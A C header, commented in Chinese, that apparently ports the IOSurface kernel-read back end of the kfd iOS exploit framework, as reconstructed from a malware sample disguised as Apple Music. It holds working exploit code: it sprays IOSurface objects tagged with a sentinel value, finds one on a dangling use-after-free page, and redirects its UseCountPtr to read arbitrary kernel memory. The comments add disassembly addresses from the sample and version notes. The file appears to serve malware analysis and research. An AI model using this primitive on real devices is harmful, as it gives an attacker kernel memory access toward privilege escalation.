/*
 * kread_IOSurface.h —— 样本独有的第三个 kread 后端。
 *
 * 来源与依据
 * ----------
 * 上游 felix-pb/kfd 只有两个 kread 方法；这个后端最早出现在
 * opa334/kfd（kfd/libkfd/krkw/kread/kread_IOSurface.h），起技术来自
 * weightBufs。Vertex 的 README 说明了沿革：
 *     "The IOSurface kernel read/write technique used was originally used in
 *      weightBufs and then adapted for kfd in opa334's fork."
 * 样本（Apple Music 伪装壳）把它照搬了进来，于是 kopen 的断言变成
 * "kread_method <= kread_IOSurface"。
 *
 * 样本实测（字符串池解密 + 反汇编，见 _kfd_port/样本通道权威实测结论.md）
 * ----------------------------------------------------------------
 *   "kread_IOSurface.h"        0x101CBA2A0
 *   "kread_IOSurface_init"     0x101CBA2E0
 *   "IOSurfaceRoot"            0x101CBA303
 *   "IOSurface_shared.h"       0x101CBA340
 *   "kr == KERN_SUCCESS"       0x101CBA380
 *   "create_surface_fast_path" 0x101CBA3C0
 *   "release_surface"          0x101CBA3E9
 *   ops.init  槽 (kfd+0x458) 守卫常量 0x100F7C218
 *   ops.kread 槽 (kfd+0x470) 守卫常量 0x100F7B828
 *   0x100F7C89C  krkw_maximum_id    = 0x1000
 *   0x100F7C8A4  krkw_object_size   = 0x400
 *   0x100F7C8AC  krkw_method_data_size = 0x8000
 *   0x100F7D364  PixelFormat 哨兵 = 0x1EA5CACE
 *   0x100F7D5B8..  x10 = [表+0x10]（运行时填 0x14）
 *                  sub x10, x1, x10  →  kaddr - ReadDisplacement
 *                  与下面 kread_IOSurface_kread_u32 的写法逐条同构
 *
 * 读路径说明
 * ----------
 * IOSurface 在这里是 PUAFF 悬空页的"载体对象"：靠 PixelFormat 哨兵认领对象，
 * 再把对象里的 UseCountPtr 改成 (目标地址 - ReadDisplacement)，
 * 调 iosurface_get_use_count 让内核把数据搬回来。样本那 0x14 就是
 * ReadDisplacement（不是 IndexedTimestampPtr，后者是 0x360 —— 写路径才用它）。
 *
 * 注意 iOS 16
 * -----------
 * Vertex README 原文：iOS 16 起 IOSurface 手法被缓解——arm64e 上有更多 data PAC，
 * 且 userclient 方法改成"读回目标地址处相邻两个 32 位整数之和"而不是单个整数。
 * opa334 的 IOSurface_versions[] 里 iOS 16 那几项是空的，注释即
 * "iOS 16 is left to the educated reader to figure out"。
 * 所以这条路在 iOS 16 上未必可用，见 _kfd_port/IOSurface后端落地记录.md。
 */

#ifndef kread_IOSurface_h
#define kread_IOSurface_h

#include "../IOSurface_shared.h"

#define IOSURFACE_MAGIC 0x1EA5CACE

/*
 * 三个常量取自样本 kread_IOSurface_init 的实测立即数（见文件头）。
 * 注意与 opa334 原版不同：opa334 用 maximum_id = 0x4000、
 * method_data_size = maximum_id * sizeof(struct iosurface_obj)；
 * 样本是 0x1000 / 0x8000，即每项 8 字节。
 */
#define KREAD_IOSURFACE_MAXIMUM_ID  0x1000
#define KREAD_IOSURFACE_OBJECT_SIZE 0x400
#define KREAD_IOSURFACE_DATA_SIZE   0x8000

u32 kread_IOSurface_kread_u32(struct kfd* kfd, u64 kaddr);

void kread_IOSurface_init(struct kfd* kfd)
{
    kfd->kread.krkw_maximum_id = KREAD_IOSURFACE_MAXIMUM_ID;
    kfd->kread.krkw_object_size = KREAD_IOSURFACE_OBJECT_SIZE;

    kfd->kread.krkw_method_data_size = KREAD_IOSURFACE_DATA_SIZE;
    kfd->kread.krkw_method_data = malloc_bzero(kfd->kread.krkw_method_data_size);

    /*
     * 对齐 opa334：PUAF 生效期间调 get_surface_client 在某些设备上会崩，
     * 所以在这里就先拿到连接并一直持有。
     */
    g_surface_connect = get_surface_client();
}

void kread_IOSurface_allocate(struct kfd* kfd, u64 id)
{
    u64* surface_ids = (u64*)(kfd->kread.krkw_method_data);

    IOSurfaceFastCreateArgs args = {0};
    args.IOSurfaceAddress = 0;
    args.IOSurfaceAllocSize = (u32)id + 1;
    args.IOSurfacePixelFormat = IOSURFACE_MAGIC;

    u32 surface_id = 0;
    create_surface_fast_path(g_surface_connect, &surface_id, &args);
    surface_ids[id] = (u64)surface_id;
}

bool kread_IOSurface_search(struct kfd* kfd, u64 object_uaddr)
{
    volatile u32 magic = *(volatile u32*)(object_uaddr + dynamic_info(ios__PixelFormat));
    if (magic == IOSURFACE_MAGIC) {
        volatile u32 alloc_size = *(volatile u32*)(object_uaddr + dynamic_info(ios__AllocSize));
        u64 id = (u64)alloc_size - 1;
        if (id < kfd->kread.krkw_maximum_id) {
            kfd->kread.krkw_object_id = id;
            return true;
        }
    }
    return false;
}

void kread_IOSurface_kread(struct kfd* kfd, u64 kaddr, void* uaddr, u64 size)
{
    kread_from_method(u32, kread_IOSurface_kread_u32);
}

void kread_IOSurface_find_proc(struct kfd* kfd)
{
    /* 由 kread 反查 kernel_proc / current_proc，与 sem_open 后端同源。 */
    kread_sem_open_find_proc(kfd);
}

void kread_IOSurface_deallocate(struct kfd* kfd, u64 id)
{
    if (id == kfd->kread.krkw_object_id) {
        return;
    }
    /*
     * 样本的 method_data 每项 8 字节，只留 surface_id、没留 user client port，
     * 所以这里不做 release_surface（与 opa334 的 16 字节 iosurface_obj 不同）。
     */
}

void kread_IOSurface_free(struct kfd* kfd)
{
    if (kfd->kread.krkw_method_data != NULL) {
        bzero_free(kfd->kread.krkw_method_data, kfd->kread.krkw_method_data_size);
    }
}

/*
 * 32 位读。形态与样本 0x100F7D594 起那段一致：
 *     备份 UseCountPtr → 改成 (kaddr - ReadDisplacement) → 取回 → 还原
 */
u32 kread_IOSurface_kread_u32(struct kfd* kfd, u64 kaddr)
{
    u64 iosurface_uaddr = kfd->kread.krkw_object_uaddr;
    u64* surface_ids = (u64*)(kfd->kread.krkw_method_data);

    volatile u64* use_count_ptr = (volatile u64*)(iosurface_uaddr + dynamic_info(ios__UseCountPtr));
    u64 backup = *use_count_ptr;
    *use_count_ptr = kaddr - dynamic_info(ios__ReadDisplacement);

    u32 read32 = 0;
    iosurface_get_use_count(g_surface_connect, (u32)surface_ids[kfd->kread.krkw_object_id], &read32);

    *use_count_ptr = backup;
    return read32;
}

#endif /* kread_IOSurface_h */
